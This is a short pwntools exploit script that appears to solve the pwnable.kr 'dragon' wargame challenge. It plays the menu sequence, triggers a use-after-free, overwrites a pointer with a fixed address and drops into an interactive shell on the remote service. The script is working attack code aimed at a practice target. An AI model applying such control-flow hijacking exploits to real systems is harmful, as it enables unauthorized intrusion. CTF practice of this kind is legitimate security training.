#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./dragon")
    elf = ELF("./dragon")
    #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("pwnable.kr", 9004)
    elf = ELF("./dragon")
    #  libc = ELF()

def priestLose():
    io.sendlineafter("Knight\n", "1")

    for i in xrange(2):
        io.sendlineafter("Invincible.\n", "1")

def priestWin():
    io.sendlineafter("Knight\n", "1")

    for i in xrange(4):
       io.sendlineafter("Invincible.\n", "3")
       io.sendlineafter("Invincible.\n", "3")
       io.sendlineafter("Invincible.\n", "2")

def uaf():
    payload = p32(0x8048DBF)
    io.sendlineafter("As:\n", payload)

if __name__ == "__main__":
    priestLose()
    priestWin()
    uaf()

    io.interactive()
    io.close()
